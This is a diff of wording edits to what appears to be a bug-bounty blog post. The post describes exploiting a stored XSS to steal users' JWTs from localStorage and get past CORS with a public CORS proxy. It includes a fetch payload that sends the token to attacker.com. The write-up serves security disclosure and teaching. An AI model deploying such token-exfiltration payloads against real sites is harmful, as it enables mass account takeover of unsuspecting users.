@@ -14,19 +14,19 @@ In order words: how to not get c\*\*k-blocked by CORS.
 
 I recently found a stored Cross-site Scripting (XSS) vulnerability while hunting at a target.
 
-While the bug class itself is not particularly spectacular, what interested me was on _what_ I do with it.
+While the bug class itself is not particularly spectacular, what interested me was on _what_ I could do with it.
 
-Showing an alert popup is fine and all, but impact of that level would likely only net me a `Medium` in severity at HackerOne. To justify for anything higher, I have to get creative on showing its possible disastrous impact.
+Showing an alert popup is fine and all, but impact of that level would likely only net me a `Medium` in severity at HackerOne. To justify for anything higher, I have to get creative on showing its potential disastrous impact.
 
 Given that this is a stored XSS, I thought to myself:
 
-> What if I were to demonstrate that an attacker can essentially farm for credentials of any authenticated users who browses the affected page? Account takeover would be trivial!
+> What if I demonstrate that an attacker can essentially harvest credentials from any authenticated user who browses the affected page? In that case, mass account takeovers would be trivial!
 
-An idea worthy trying out, especially since the application stores the value of its JWT in the browser's `localStorage` as `token`.
+An idea worth trying out, especially since the application stores the value of its JWT in the browser's `localStorage` as `token`.
 
-I can simply swap out the typical payload of `alert(document.domain)` to one that retrieves the token and make a GET request to a server under my control.
+I can simply swap out the typical payload of `alert(document.domain)` with one that retrieves the token and makes a GET request to a server under my control.
 
-Just like this; that should be it... right?
+Just like this; and that should be it... right?
 
 ```javascript
 fetch("https://attacker.com:8000/jwt=" + JSON.stringify(localStorage.getItem("token")));
@@ -34,7 +34,9 @@ fetch("https://attacker.com:8000/jwt=" + JSON.stringify(localStorage.getItem("to
 
 Nope-- what greeted me was this sad little error message in the console instead:
 
-> Access to fetch at 'https://attacker.com:8000/?jwt=xxx' from origin 'https://example.redacted.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
+> Access to fetch at 'https://attacker.com:8000/?jwt=xxx' from origin 'https://example.redacted.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
+>
+> If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
 
 Very sad indeed.
 
@@ -44,7 +46,7 @@ Now, before we go into that, let's first understand what is **Same-Origin Policy
 
 Long story short, SOP prevents one origin from accessing resources of another origin.
 
-Origin here is defined as `protocol://hostname:port`. In other words, for one origin to be evaluated as the same with another origin, the values of these three variables must be _exactly_ the same.
+Origin here is defined as `protocol://hostname:port`. In other words, in order for one origin to be considered the same as another origin, the values of these three variables must be _exactly_ the same.
 
 Let's take `https://example.com/latest` as an example:
 
@@ -71,7 +73,7 @@ The most common CORS-related headers are:
 - `Access-Control-Allow-Credentials` that indicates if the request can include cookies
 - `Access-Control-Expose-Headers` that instructs the browser to expose certain headers to JavaScript
 
-If If resources from `https://example.com/` were to be successfully loaded by `https://api.example.com/`, the response of the latter must have the following CORS header:
+If resources from `https://example.com/` were to be successfully loaded by `https://api.example.com/`, the response of the latter must have the following CORS header:
 
 ```
 Access-Control-Allow-Origin: https://example.com
@@ -85,7 +87,7 @@ And this is why we had our little error: our `https://attacker.com/` doesn't ret
 
 Well, yes.
 
-The request was indeed sent, but that didn't mean the delivered content was legible from the web server. In fact, it was a bunch of truly horrible-looking 400 Bad Request errors.
+The request was indeed sent, but that didn't mean the delivered content was legible from the web server. In fact, it was a bunch of truly horrible-looking `400 Bad Request` errors.
 
 ```bash
 bot@bucketoftears:~$ python3 -m http.server 8000
@@ -98,7 +100,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 No amount of Googling had enlightened me on what-the-loving-fuck is happening here (probably something to do with that missing CORS header), so I moved on to my next brilliant idea -- using CORS proxies!
 
-CORS proxy essentially acts as an intermediary that helpfully adds the required `Access-Control-Allow-Origin` header. It's easy -- doesn't require server setups of any kind -- and already has many instances online for immediate use (e.g. `CORS Anywhere`, `alloworigin`).
+A CORS proxy essentially acts as an intermediary that helpfully adds the required `Access-Control-Allow-Origin` header. It's easy -- doesn't require server setups of any kind -- and already has many instances online for immediate use (e.g. `CORS Anywhere`, `alloworigin`).
 
 One just needs to prefix the chosen proxy's URL to `https://attacker.com` and the proxy in question will:
 
@@ -106,7 +108,9 @@ One just needs to prefix the chosen proxy's URL to `https://attacker.com` and th
 2. Add the `Access-Control-Allow-Origin` header to the response from `https://attacker.com`
 3. Passes that response, with that added header, back to the requesting `https://attacker.com`
 
-Sounds simple! Now, let's try this out on the XSS payload...
+Sounds simple!
+
+Now, let's try this out on the XSS payload...
 
 ```javascript
 fetch(
@@ -115,7 +119,7 @@ fetch(
 );
 ```
 
-... and voilà, the JWT we are looking for on our attack server!
+... voilà, the JWT we are looking for on our web server!
 
 ```bash
 bot@bucketoftears:~$ python3 -m http.server 8000
